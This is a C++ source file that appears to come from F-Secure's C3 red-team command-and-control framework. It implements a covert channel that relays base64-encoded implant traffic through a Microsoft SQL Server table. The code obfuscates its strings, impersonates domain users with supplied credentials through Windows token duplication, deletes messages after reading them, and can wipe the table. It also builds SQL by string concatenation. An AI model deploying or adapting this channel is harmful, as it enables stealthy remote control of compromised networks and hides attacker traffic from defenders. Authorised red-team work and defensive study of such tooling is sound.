#include "Stdafx.h"
#include "MSSQL.h"
#include <sqlext.h>
#include <sqltypes.h>
#include <sql.h>
#include "Common/FSecure/Crypto/Base64.h"

#define DATA_LEN 4096
#define ID_COLUMN 1
#define MSGID_COLUMN 2
#define MSG_COLUMN 3
#define MAX_MSG_BYTES 700000000

FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	ByteReader{ arguments }.Read(m_servername, m_databasename, m_tablename, m_useSSPI, m_username, m_password);
	
	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;

	//create a new impersonation token and inject it into the current thread.
	if (m_useSSPI && !this->m_username.empty())
	{
		std::string user, domain;
		HANDLE hToken;
		user = this->m_username.substr(this->m_username.find("\\") + 1, this->m_username.size());
		domain = this->m_username.substr(0, this->m_username.find("\\"));

		if (!LogonUserA(user.c_str(), domain.c_str(), this->m_password.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken))
			throw std::runtime_error("[x] error creating Token");

		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &m_impersonationToken))
			throw std::runtime_error("[x] error duplicating token");

		CloseHandle(hToken);
	}
	
	if (Connect(&hConn, &hEvt) == SQL_ERROR)
		throw std::runtime_error(OBF("[x] Unable to connect to MSSQL database"));

	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

	//Initial SQL Query is to identify if m_tablename exists
	std::string stmtString = OBF("Select * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = '") + m_tablename + OBF("';");
	SQLRETURN retCode = SQLExecDirectA(hStmt, (SQLCHAR*)stmtString.c_str(), SQL_NTS);
	
	if (retCode != SQL_SUCCESS && retCode != SQL_SUCCESS_WITH_INFO)
	{
		throw std::runtime_error(OBF("[x] Unable to get DB schema"));
	}

	//if there are no rows then the table doesn't exist - so create it
	if (SQLFetch(hStmt) != SQL_SUCCESS)
	{
														
		stmtString = OBF("CREATE TABLE dbo.") + this->m_tablename + OBF(" (ID INT IDENTITY(1,1) NOT NULL PRIMARY KEY, MSGID varchar(250), MSG varchar(max));");
		
		SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
		SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

		retCode = SQLExecDirectA(hStmt, (SQLCHAR*)stmtString.c_str(), SQL_NTS);

		//couldn't create the table so don't continue
		if (retCode != SQL_SUCCESS && retCode != SQL_SUCCESS_WITH_INFO)
		{
			throw std::runtime_error(OBF("[x] Unable to create table"));
		}
	}
	
	//cleanup
	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
	SQLDisconnect(hConn);
	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
	SQLFreeHandle(SQL_HANDLE_ENV, hEvt);

}

size_t FSecure::C3::Interfaces::Channels::MSSQL::OnSendToChannel(FSecure::ByteView packet)
{
	//connect to the database
	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
	
	if (Connect(&hConn, &hEvt) == SQL_ERROR)
		throw std::runtime_error(OBF("[x] Unable to connect to MSSQL database"));


	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
	
	int bytesWritten = 0;
	std::string b64packet = "";
	std::string strpacket = "";
	int actualPacketSize = 0;
	
	//Rounded down: Max size of bytes that can be put into a MSSQL database before base64 encoding
	if (packet.size() > MAX_MSG_BYTES) 
	{
		
		actualPacketSize = std::min((size_t)MAX_MSG_BYTES, packet.size());
		strpacket = packet.SubString(0, actualPacketSize);

		b64packet = cppcodec::base64_rfc4648::encode(strpacket.data(), strpacket.size());
		bytesWritten = strpacket.size();
	}
	else 
	{
		b64packet = cppcodec::base64_rfc4648::encode(packet.data(), packet.size());
		bytesWritten = packet.size();
	}

	std::string stmtString = OBF("INSERT into dbo.") + this->m_tablename + OBF(" (MSGID, MSG) VALUES ('") + this->m_outboundDirectionName + "', '" + b64packet + OBF("');");
	
	if (SQLExecDirectA(hStmt, (SQLCHAR*)stmtString.c_str(), SQL_NTS) != SQL_SUCCESS)
		throw std::runtime_error(OBF("[x] Could not insert data\n"));

	
	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
	SQLDisconnect(hConn);
	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
	SQLFreeHandle(SQL_HANDLE_ENV, hEvt);
	return bytesWritten;
}

std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnReceiveFromChannel()
{
	//connect to the database
	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
	if (Connect(&hConn, &hEvt) == SQL_ERROR)
		throw std::runtime_error(OBF("[x] Unable to connect to MSSQL database"));


	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

	std::string stmt = OBF("SELECT TOP 100 * FROM dbo.") + this->m_tablename + OBF(" WHERE MSGID = '") + this->m_inboundDirectionName + OBF("';");
	SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);

	std::vector<ByteVector> messages;
	std::vector<json> data;
	
	while (SQLFetch(hStmt) == SQL_SUCCESS) 
	{
		SQLCHAR ret[DATA_LEN];
		SQLLEN len;

		std::string output;
		std::string id;

		//get the ID
		SQLGetData(hStmt, ID_COLUMN, SQL_CHAR, ret, DATA_LEN, &len);
		id = (char*)ret;
		json j;
		j[OBF("id")] = id;
	
		//Get the MSG column
		SQLGetData(hStmt, MSG_COLUMN, SQL_CHAR, ret, DATA_LEN, &len);
		
		output += (char*)ret;

		if (len > DATA_LEN)
		{
			//loop until there is no data left
			while (len > DATA_LEN)
			{
				SQLGetData(hStmt, MSG_COLUMN, SQL_CHAR, ret, DATA_LEN, &len);
				output += (char*)ret;
			}

		}
		j[OBF("msg")] = output.c_str();
		data.push_back(j);
	}
	
	std::string idList = "";
	stmt = OBF("DELETE FROM dbo.") + this->m_tablename + OBF(" WHERE ID IN (");

	for (auto &msg : data)
	{
		//build a string '1','2','3',....,'N'
		idList += OBF("'") + msg[OBF("id")].get<std::string>();
		idList += OBF("',");

		//add the message to the messages vector
		auto m = cppcodec::base64_rfc4648::decode(msg[OBF("msg")].get<std::string>());
		
		messages.push_back(std::move(m));
	}

	//no need to send an empty delete command
	if (messages.size() > 0)
	{
		//delete the row in the DB - must realloc the stmt handle
		SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
		SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

		//Remove the trailing "," from the idList
		stmt += idList.substr(0, idList.size() - 1) + OBF(");");
		
		//Delete all of the rows we have just read
		SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);
	}
	
	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
	SQLDisconnect(hConn);
	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
	SQLFreeHandle(SQL_HANDLE_ENV, hEvt);
	return messages;
}

SQLRETURN FSecure::C3::Interfaces::Channels::MSSQL::Connect(SQLHANDLE* hConn, SQLHANDLE* hEvt)
{
	SQLCHAR ret[DATA_LEN];
	SQLHANDLE lhConn = NULL, lhStmt = NULL, lhEvt = NULL;
	std::string connString;

	if (SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &lhEvt) != SQL_SUCCESS)
		throw std::runtime_error(OBF("[x] Error allocating handle"));
	if (SQLSetEnvAttr(lhEvt, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0) != SQL_SUCCESS)
		throw std::runtime_error(OBF("[x] Error allocating handle"));
	if (SQLAllocHandle(SQL_HANDLE_DBC, lhEvt, &lhConn) != SQL_SUCCESS)
		throw std::runtime_error(OBF("[x] Error allocating handle"));

	if (this->m_useSSPI)
	{
		if (!this->m_username.empty())
		{
			//Sending and recieving could be different threads, have to inject the token per-thread
			if (!SetThreadToken(NULL, this->m_impersonationToken))
				throw std::runtime_error("[x] error setting token");
		}
			
		connString = OBF("DRIVER={SQL Server};SERVER=") + this->m_servername + OBF(", 1433;") + OBF("DATABASE=") + this->m_databasename + OBF(";Integrated Security=SSPI;");
	}
	else
		connString = OBF("DRIVER={SQL Server};SERVER=") + this->m_servername + OBF(", 1433;") + OBF("DATABASE=") + this->m_databasename + OBF(";UID=") + this->m_username + OBF(";PWD=") + this->m_password;



	SQLRETURN retCode = SQLDriverConnectA(lhConn, NULL, (SQLCHAR*)connString.c_str(), SQL_NTS, ret, DATA_LEN, NULL, SQL_DRIVER_NOPROMPT);
	
	//Pointer dereferencing is done here to make the code easier to read
	*hConn = lhConn;
	*hEvt = lhEvt;

	SQLFreeHandle(SQL_HANDLE_ENV, lhEvt);
	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
	return retCode;

}

FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::OnRunCommand(ByteView command)
{

	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
	case 0:
		return ClearTable();
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::ClearTable()
{
	//connect to the database
	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
	if (Connect(&hConn, &hEvt) == SQL_ERROR)
		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));


	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

	std::string stmt = OBF("DELETE FROM dbo.") + this->m_tablename + ";";
	SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);

	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

	//reset the ID to 0
	stmt = "DBCC CHECKIDENT('dbo." + this->m_tablename + "', RESEED, 0)";
	SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);
	return {};


}

const char* FSecure::C3::Interfaces::Channels::MSSQL::GetCapability()
{
	return R"_(
            {
                "create": {
		            "arguments":
		            [
			            [
				            {
					            "type": "string",
					            "name": "Input ID",
					            "min": 4,
					            "randomize": true,
					            "description": "Used to distinguish packets for the channel"
				            },
				            {
					            "type": "string",
					            "name": "Output ID",
					            "min": 4,
					            "randomize": true,
					            "description": "Used to distinguish packets from the channel"
				            }
			            ],
			            {
				            "type": "string",
				            "name": "Server Name",
				            "description": "The Host of the target database"
			            },
			            {
				            "type": "string",
				            "name": "Database Name",
				            "description": "The name of the database to write to"
			            },
			            {
				            "type": "string",
				            "name": "Table Name",
				            "description": "The name of the table to write to"
			            },
						{
				            "type": "string",
				            "name": "Username",
				            "description": "The username used to authenticate to the database. If using a domain user put in the format DOMAIN\\Username",
							"min": 0
			            },
			            {
				            "type": "string",
				            "name": "Password",
				            "description": "The password used to authenticate to the database",
							"min": 0
			            },
						{
							"type": "boolean",
							"name": "Use Integrated Security (SSPI) - use for domain joined accounts",
							"description": "Set this to true and provide a domain\\username and password to perform token impersonation OR Set this to true and provide no credentials and the current process token will be used with SSPI",
							"defaultValue": false
						}
		            ]
                },
               "commands":
	[
		{
			"name": "Clear DB Table",
			"id": 0,
			"description": "Deletes all rows in the database",
			"arguments": []
		}
	]
}
)_";
 
}

